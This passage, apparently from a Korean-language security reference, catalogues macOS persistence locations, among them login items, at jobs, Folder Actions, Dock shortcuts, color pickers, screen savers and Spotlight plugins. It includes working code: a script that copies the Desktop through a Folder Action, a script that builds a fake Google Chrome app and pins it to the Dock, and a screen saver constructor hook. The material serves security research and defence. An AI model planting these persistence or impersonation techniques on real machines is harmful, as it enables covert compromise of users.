  - **트리거:** 승인된 에이전트는 등록 시 및 이후 로그인 시 시작될 수 있으며, 승인된 데몬은 부팅 시 시작됩니다. 데몬에는 관리자 승인이 필요합니다.

#### 설명

**시스템 설정 → 일반 → 로그인 항목 및 확장 프로그램**에서 사용자는 로그인 항목과 백그라운드 항목을 확인할 수 있습니다. macOS 13 및 이후 버전에서는 번들 로그인 항목, launch agent, launch daemon을 등록하는 [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice)를 제공합니다. 이 기능의 [`register()` 동작](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29)은 유형과 승인 상태에 따라 다릅니다. **헬퍼를 앱 번들에 넣는 것만으로는 새 로그인 항목이 등록되지 않습니다.** 반대로, 이미 등록된 헬퍼 실행 파일에 쓰기 권한이 있다면 새로 등록하지 않아도 해당 실행 파일을 변경해 다음 실행에 영향을 줄 수 있습니다. 먼저 실제 경로와 코드 서명 검사를 확인하세요.

다음은 Mac에서 번들 헬퍼를 찾아보는 읽기 전용 방법입니다. 이 방법으로는 어떤 항목도 등록하거나 실행하지 않습니다:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

번들 launch plist의 경우 `BundleProgram`은 [Apple의 Service Management 마이그레이션 안내](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos)에 명시된 대로 **앱 번들 루트 기준으로** 해석합니다(예: `Contents/MacOS/Helper`). 연구용 Mac에서 읽기 전용으로 `/Applications`를 조사한 결과 번들 helper 항목 14개와 `BundleProgram` 선언 5개를 찾았습니다. 다섯 대상 모두 경로가 확인되었으며, 두 대상은 사용자 쓰기 권한 검사도 통과했습니다. 이 검사만으로 두 helper 중 어느 하나라도 등록 또는 활성화되어 있는지, 서명 검증 후 실행 가능한지, 샌드박스에서 접근 가능한지는 확인할 수 없습니다. 이 Mac에서 `sfltool dumpbtm`은 이름이 지정된 레코드 150개를 표시했습니다. 이는 검사 도구일 뿐 모든 레코드가 실행 중임을 확인하는 테스트가 아닙니다.

이전 버전의 로그인 항목은 Apple events를 통해서도 관리할 수 있습니다. 명령줄에서 항목을 나열하고, 추가하고, 제거할 수 있지만, 항목을 추가하면 사용자의 영구 로그인 구성이 변경되며 Automation 승인이 필요할 수 있습니다:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`는 구현 세부 사항이지, 파일을 단순히 써 넣어 payload를 설치하도록 지원되는 위치가 아닙니다. 이전 `SMLoginItemSetEnabled` API는 새로운 helper의 경우 `SMAppService`로 대체되었습니다. 페이지에 이전에 기재된 `/var/db/com.apple.xpc.launchd/loginitems.501.plist` 경로는 macOS 26.5.2 테스트 머신에 존재하지 않았습니다. 최신 Login Item을 평가할 때는 추정한 데이터베이스 경로가 아니라 등록 API와 시스템 UI 상태를 확인하세요.

### ZIP as Login Item

(이전 Login Items 섹션을 확인하세요. 이 내용은 확장입니다.)

**ZIP** 파일을 **Login Item**으로 저장하면 **`Archive Utility`**가 이를 열게 됩니다. 예를 들어 zip 파일을 **`~/Library`**에 저장하고 그 안에 백도어가 포함된 **`LaunchAgents/file.plist`** 폴더가 있다면, 해당 폴더가 생성되고(기본적으로는 존재하지 않음) plist가 추가됩니다. 그러면 다음에 사용자가 다시 로그인할 때 **plist에 지정된 백도어가 실행됩니다**.

또 다른 방법은 사용자 HOME에 **`.bash_profile`** 및 **`.zshenv`** 파일을 만드는 것입니다. 이렇게 하면 LaunchAgents 폴더가 이미 있어도 이 기법은 여전히 작동합니다.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 하지만 **`at`**을 **실행**해야 하고, 활성화되어 있어야 합니다.
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`at`**을 **실행**해야 하고, 활성화되어 있어야 합니다.

#### **설명**

`at` 작업은 특정 시간에 실행할 **일회성 작업을 예약**하도록 설계되었습니다. cron 작업과 달리 `at` 작업은 실행 후 자동으로 제거됩니다. 이 작업은 시스템 재부팅 후에도 지속되므로 특정 조건에서는 보안 문제가 될 수 있다는 점에 유의해야 합니다.<sup>[[16]](#references)</sup>

번들에 포함된 `com.apple.atrun.plist`에는 `Disabled = true`가 설정되어 있지만, launchd는 실제 활성화/비활성화 재정의를 별도로 유지합니다. macOS 26.5.2 테스트 머신에서는 이 번들 키와 달리 `launchctl print-disabled system` 결과에서 `com.apple.atrun`이 **활성화됨**으로 표시되었습니다. `at` 작업이 실행될 것이라고 단정하기 전에 실제 적용 상태를 확인하세요:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

관리자는 `launchctl`을 사용해 비활성화된 `atrun` 서비스를 활성화할 수 있습니다. 다음 과거 예시는 시스템 서비스 상태를 변경하며, 연구용 Mac에서는 **실행하지 않았습니다**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

이렇게 하면 1시간 후에 파일이 생성됩니다:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

`atq`를 사용해 작업 큐를 확인합니다:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

위에서 두 개의 예약된 작업을 확인할 수 있습니다. `at -c JOBNUMBER`를 사용하면 작업의 세부 정보를 출력할 수 있습니다.

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> AT task가 활성화되어 있지 않으면 생성된 task가 실행되지 않습니다.

**작업 파일**은 `/private/var/at/jobs/`에서 찾을 수 있습니다.

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

파일명에는 큐, 작업 번호, 예약 실행 시간이 포함됩니다. 예를 들어 `a0001a019bdcd2`를 살펴보겠습니다.

- `a` - 큐입니다
- `0001a` - 16진수 작업 번호입니다. `0x1a = 26`
- `019bdcd2` - 16진수 시간입니다. epoch 이후 경과한 분을 나타냅니다. `0x019bdcd2`는 10진수로 `26991826`입니다. 여기에 60을 곱하면 `1619509560`이 되며, 이는 `GMT: 2021년 4월 27일 화요일 7:46:00`입니다.

작업 파일을 출력해 보면 `at -c`를 사용해 확인한 것과 같은 정보가 들어 있습니다.

### Calendar의 파일 열기 알림

- **쓰기 대상:** Calendar 이벤트의 사용자 지정 **Open file** 알림에서 **이미 선택된** 실행 가능한 앱 번들 또는 다른 파일입니다. 알림을 생성하거나 편집하려면 Calendar 또는 승인된 캘린더 데이터 소스를 통해 해당 캘린더 이벤트에 접근해야 합니다. 임의의 파일을 쓰는 것만으로는 알림이 생성되지 않습니다.
- **트리거:** Calendar가 이벤트를 처리하는 Mac에서 알림이 예약된 시간입니다. 반복 이벤트는 작업을 반복할 수 있습니다. [Apple의 최신 Calendar 가이드](https://support.apple.com/guide/calendar/icl1012/mac)에서는 macOS 26의 **Custom → Open file** 알림 옵션을 확인할 수 있습니다.
- **실행 ID 및 제한 사항:** Calendar는 로그인한 사용자의 연결된 앱을 통해 선택한 파일을 엽니다. 앱 번들을 실행하면 해당 사용자 권한으로 코드가 실행될 수 있지만, Gatekeeper, quarantine 및 기타 macOS 검사를 통과해야 합니다. 일반 스크립트 파일은 편집기에서 열릴 수 있으며, 확장자만으로 코드 실행을 입증할 수는 없습니다.

후보 파일을 안전하게 평가하려면 Calendar에서 이벤트 알림과 선택된 파일의 권한을 확인하세요. 이 경로는 Apple 가이드에 근거해 문서화했으며, 테스트하면 실제 캘린더를 수정하고 데스크톱 이벤트를 기다려야 하므로 연구용 Mac에서는 실행하지 않았습니다. 일회용 계정에서는 마커만 남기는 앱 번들을 선택하고 가까운 미래의 Open file 알림을 설정해 실행을 확인한 뒤, 이벤트와 앱을 삭제할 수 있습니다.

### macOS의 Shortcuts 자동화

- **쓰기 대상:** 단축어 동작에서 **이미 참조된** 실행 파일 또는 권한이 있는 사용자가 편집할 수 있는 기존 단축어입니다. 임의의 `.shortcut` 파일이나 문서화되지 않은 Shortcuts 데이터베이스에 쓰는 것은 지원되는 자동화 등록 방법이 아닙니다.
- **트리거 및 ID:** 시간대 또는 앱 이벤트와 같이 미리 설정되고 활성화된 자동화 이벤트가 로그인한 사용자를 위해 단축어를 실행합니다. [Apple의 최신 Mac 자동화 가이드](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac)에는 지원되는 이벤트와 확인 없이 자동화를 실행할 수 있는 조건, 트리거 제거 방법이 설명되어 있습니다. [Apple의 Shortcuts 개인정보 보호 가이드](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac)에 따르면 스크립트 동작에는 **Allow Running Scripts**가 필요하며, 개별 동작에서 추가 권한을 요청할 수도 있습니다.

이 경로는 **기존 동작이 쓰기 가능한 대상을 불러오는 경우에만** 쓰기에서 실행으로 이어집니다. UI를 통해 새 자동화를 만들면 실제 설정이 변경되므로 연구용 Mac에서는 시도하지 않았습니다. 일회용 계정에서 소유자는 `/tmp/ht-shortcuts-marker`를 건드리는 스크립트가 포함된 시간대 단축어를 설정하고, 필요한 권한을 활성화한 뒤 이벤트 후 마커를 확인하고 자동화, 단축어 및 마커를 삭제할 수 있습니다.

### Automator 동작 및 Quick Actions

- **쓰기 대상:** 동작 번들의 경우 `~/Library/Automator/*.action`(사용자) 및 `/Library/Automator/*.action`(관리자)입니다. 저장된 Quick Action 워크플로는 일반적으로 `~/Library/Services/*.workflow`에 있으며, 사용자가 선택한 실제 워크플로 경로를 확인하세요. [Apple의 Automator 프레임워크 레퍼런스](https://developer.apple.com/documentation/automator)에는 동작 검색 디렉터리가 나와 있습니다.
- **트리거:** Automator는 실행될 때 사용 가능한 동작 번들을 불러오지만, 동작의 작업은 해당 동작을 사용하는 워크플로가 실행될 때 수행됩니다. 사용자가 Finder, Services 또는 다른 메뉴에서 Quick Action을 선택하면 실행됩니다. Folder Action 워크플로는 **이미 연결된** 폴더에 항목이 추가될 때 실행되고, Calendar Alarm 워크플로는 이벤트 시간에 실행됩니다. [Apple의 워크플로 유형 가이드](https://support.apple.com/guide/automator/aut7cac58839/mac)에서 이러한 이벤트를 구분합니다. 동작이나 워크플로를 작성하는 것만으로는 폴더가 연결되거나 캘린더 이벤트가 예약되지 않습니다.
- **실행 ID 및 제한 사항:** 워크플로를 실행하는 계정입니다. Automator 또는 호출 앱이 동작을 불러와야 하며, 현재의 코드 서명 및 개인정보 보호 검사가 이를 허용해야 합니다. 활성 워크플로에서 이미 참조하는 쓰기 가능한 동작 번들은 새 동작을 설치한 뒤 사용자가 선택하기를 기다리는 경우와 다릅니다.

macOS 26.5.2 테스트 Mac에는 사용자 `Automator` 및 `Services` 디렉터리가 있었고 `/Library/Automator`는 없었습니다. 실제 워크플로를 생성하거나 연결하거나 실행하지 않았습니다. 특정 불러오기 경로를 확인하려면 일회용 계정과 마커만 사용하는 동작/워크플로를 사용하세요. 이벤트 소스에 대한 자세한 내용은 별도의 [Folder Actions](#folder-actions) 섹션을 참조하세요.

### Folder Actions

분석 글: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
분석 글: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 하지만 Folder Actions를 설정하려면 **`System Events`**에 연결할 수 있도록 인수를 지정해 `osascript`를 호출할 수 있어야 합니다.
- TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
  - Desktop, Documents, Downloads 등 기본적인 TCC 권한이 일부 있습니다.

#### 위치

- **`/Library/Scripts/Folder Action Scripts`**
  - root 권한 필요
  - **트리거**: 지정된 폴더에 접근
- **`~/Library/Scripts/Folder Action Scripts`**
  - **트리거**: 지정된 폴더에 접근

#### 설명 및 악용

Folder Actions는 항목 추가나 제거 등 폴더의 변경 또는 폴더 창 열기나 크기 조정과 같은 작업에 의해 자동으로 트리거되는 스크립트입니다. 이러한 작업은 다양한 용도로 활용할 수 있으며 Finder UI나 터미널 명령 등 여러 방식으로 트리거할 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions를 설정하는 방법은 다음과 같습니다.

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)로 Folder Action 워크플로를 만들고 서비스로 설치합니다.
2. 폴더의 컨텍스트 메뉴에서 Folder Actions Setup을 통해 스크립트를 수동으로 연결합니다.
3. OSAScript를 사용해 `System Events.app`에 Apple Event 메시지를 보내고 Folder Action을 프로그래밍 방식으로 설정합니다.
   - 이 방법은 동작을 시스템에 포함해 일정 수준의 지속성을 확보하는 데 특히 유용합니다.

다음 스크립트는 Folder Action에서 실행할 수 있는 예입니다.

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

위 스크립트를 Folder Actions에서 사용할 수 있도록 하려면 다음 명령으로 컴파일합니다:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

스크립트를 컴파일한 후 아래 스크립트를 실행해 Folder Actions를 설정하세요. 이 스크립트는 Folder Actions를 전역적으로 활성화하고, 앞서 컴파일한 스크립트를 Desktop 폴더에 연결합니다.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

다음과 같이 설정 스크립트를 실행합니다:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUI를 통해 이 persistence를 구현하는 방법은 다음과 같습니다.

실행될 script는 다음과 같습니다:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

다음 명령으로 컴파일합니다: `osacompile -l JavaScript -o folder.scpt source.js`

다음 위치로 이동합니다:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

그런 다음 `Folder Actions Setup` 앱을 열고, **감시할 폴더**를 선택한 다음 여기서는 **`folder.scpt`**를 선택합니다(제 경우에는 `output2.scp`라고 이름 붙였습니다).

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

이제 **Finder**에서 해당 폴더를 열면 스크립트가 실행됩니다.

이 설정은 base64 형식으로 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**에 저장되었습니다.

이제 GUI에 접근하지 않고 이 persistence를 준비해 보겠습니다.

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**를 `/tmp`에 복사해 백업합니다.
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 방금 설정한 Folder Actions를 **제거**합니다.

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

이제 비어 있는 환경이 준비되었습니다.

3. 백업 파일을 복사합니다: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Folder Actions Setup.app을 열어 이 설정을 적용합니다: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 저는 이 방법이 작동하지 않았지만, writeup에 나온 지침은 다음과 같습니다:(

### Dock 바로 가기

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 하지만 시스템 내부에 악성 애플리케이션이 설치되어 있어야 합니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `~/Library/Preferences/com.apple.dock.plist`
  - **트리거**: 사용자가 Dock 안의 앱을 클릭할 때

#### 설명 및 Exploitation

Dock에 표시되는 모든 애플리케이션은 plist **`~/Library/Preferences/com.apple.dock.plist`**에 지정되어 있습니다.<sup>[[19]](#references)</sup>

다음과 같이 **애플리케이션을 추가**할 수 있습니다.

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

**social engineering**을 이용하면 **예를 들어 Google Chrome을 사칭해 dock에 표시하고 실제로 자신의 스크립트를 실행할 수 있습니다**:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### 입력 방식

- **작성 대상:** `~/Library/Input Methods/`(사용자) 또는 `/Library/Input Methods/`(관리자)에 설치된 코드가 포함된 입력 방식 앱 번들입니다. 이는 그 자체로 임의 코드 페이로드가 되지 않는 Apple의 일반 텍스트 `.inputplugin` 키보드 매핑 파일과는 다릅니다.
- **트리거:** 사용자가 **시스템 설정 → 키보드 → 텍스트 입력**에서 입력 소스를 추가/활성화한 다음 선택하거나 사용합니다. 디렉터리에 번들을 복사하는 것만으로 macOS가 실행한다는 증거가 되지는 않습니다. [Apple의 최신 입력 소스 안내서](https://support.apple.com/guide/mac-help/mchl84525d76/mac)는 소스 활성화 및 전환을 설명하고, [Apple의 InputMethodKit 문서](https://developer.apple.com/documentation/inputmethodkit)는 코드가 포함된 입력 방식을 다룹니다.
- **실행 ID 및 조건:** 입력 방식은 로그인한 사용자로 실행되며, 입력 방식 등록, 코드 서명 및 현재 macOS 보안 검사에 따라 달라집니다. 실행 파일을 쓸 수 있는 기존 활성화 입력 방식은 별도로 경로와 서명을 검토해야 합니다.

Apple의 [이전 타사 입력 방식 안내](https://developer.apple.com/library/archive/qa/qa1810/_index.html)에서는 특정 팔레트 방식을 이 디렉터리에 복사해도 입력 소스에 표시되지 않을 수 있다고 이미 경고했습니다. macOS 26.5.2 연구용 Mac에는 사용자 디렉터리가 있지만 설치되거나 활성화된 번들은 없었습니다. 따라서 이는 로컬 런타임 결과가 아니라 문서화된 조건부 경로입니다.

### 색상 선택기

작성물: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 매우 구체적인 동작이 발생해야 합니다
  - 다른 sandbox에 들어가게 됩니다
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/Library/ColorPickers`
  - root 권한 필요
  - 트리거: 색상 선택기 사용
- `~/Library/ColorPickers`
  - 트리거: 색상 선택기 사용

#### 설명 및 익스플로잇

코드를 포함한 **색상 선택기** 번들을 **컴파일**하고([예를 들어 이 코드](https://github.com/viktorstrate/color-picker-plus)를 사용할 수 있음), [화면 보호기 섹션](macos-auto-start-locations.md#screen-saver)처럼 constructor를 추가한 다음 번들을 `~/Library/ColorPickers`에 복사합니다.<sup>[[20]](#references)</sup>

그러면 색상 선택기가 트리거될 때 번들도 함께 실행되어야 합니다.

호환되는 앱이 시스템 색상 패널을 열고 설치된 선택기를 선택해야 합니다. [Apple의 색상 패널 안내서](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html)에서는 레거시 번들 위치를 설명합니다. 로컬 경로 확인 결과 레거시 색상 선택기 XPC 서비스는 있었지만, 연구용 Mac에는 선택기가 설치되거나 로드되지 않았습니다. 경로만으로 TCC 우회를 추론하지 마세요.

라이브러리를 로드하는 바이너리에는 **매우 제한적인 sandbox**가 적용됩니다: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**작성 사례**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**작성 사례**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox 우회에 유용함: **아니요. 직접 만든 앱을 실행해야 하기 때문입니다**
- TCC 우회: 활성화된 extension의 sandbox 및 권한에 따라 다릅니다. 일반적인 우회 방법은 확인되지 않았습니다.

#### 위치

- 특정 앱

#### 설명 및 Exploit

Finder Sync Extension이 포함된 애플리케이션 예시는 [**여기에서 확인할 수 있습니다**](https://github.com/D00MFist/InSync).

애플리케이션에는 `Finder Sync Extensions`를 포함할 수 있습니다. 이 extension은 실행될 애플리케이션 내부에 들어갑니다. 또한 extension이 코드를 실행하려면 유효한 Apple 개발자 인증서로 **서명되어야** 하며, **sandbox 적용**을 받아야 합니다(완화된 예외를 추가할 수는 있음). 그리고 다음과 같은 방식으로 등록되어야 합니다:<sup>[[21]](#references)[[22]](#references)</sup>

설치된 extension은 관련 Finder 위치나 항목에서 호출되도록 **활성화**되어야 합니다. 임의의 `.appex` bundle을 작성하는 것만으로는 충분하지 않습니다. [Apple의 Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled)는 활성화 상태를 제공합니다. 아래의 `pluginkit` 명령은 명시적인 등록과 활성화를 보여주는 것으로, 파일만으로 자동 시작되는 방식은 아닙니다. 이 경로는 문서를 검토한 것이며, 연구용 Mac에 새 extension을 설치하거나 활성화하지 않았습니다.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### 화면 보호기

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 하지만 일반적인 애플리케이션 sandbox 안에서 실행됩니다.
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/System/Library/Screen Savers`
  - Root 권한 필요
  - **트리거**: 화면 보호기 선택
- `/Library/Screen Savers`
  - Root 권한 필요
  - **트리거**: 화면 보호기 선택
- `~/Library/Screen Savers`
  - **트리거**: 화면 보호기 선택

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 설명 및 Exploit

Xcode에서 새 프로젝트를 만들고 템플릿을 선택해 새 **화면 보호기**를 생성합니다. 그런 다음 여기에 코드를 추가합니다. 예를 들어 다음 코드를 사용해 로그를 생성할 수 있습니다.<sup>[[23]](#references)[[24]](#references)</sup>

이를 **빌드**한 다음 `.saver` 번들을 **`~/Library/Screen Savers`**에 복사합니다. 그런 다음 화면 보호기 GUI를 열고 해당 항목을 클릭하면 많은 로그가 생성됩니다:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> 이 코드를 로드하는 바이너리(`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`)의 entitlements에 **`com.apple.security.app-sandbox`**가 있으므로 **일반적인 애플리케이션 샌드박스 안에서 실행된다는 점에 유의하세요**.

Saver 코드:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
  - 하지만 애플리케이션 sandbox 안에서 실행됩니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox가 매우 제한적으로 보입니다

#### 위치

- `~/Library/Spotlight/`
  - **트리거**: Spotlight 플러그인이 관리하는 확장자를 가진 새 파일이 생성됩니다.
- `/Library/Spotlight/`
  - **트리거**: Spotlight 플러그인이 관리하는 확장자를 가진 새 파일이 생성됩니다.
  - Root 권한 필요
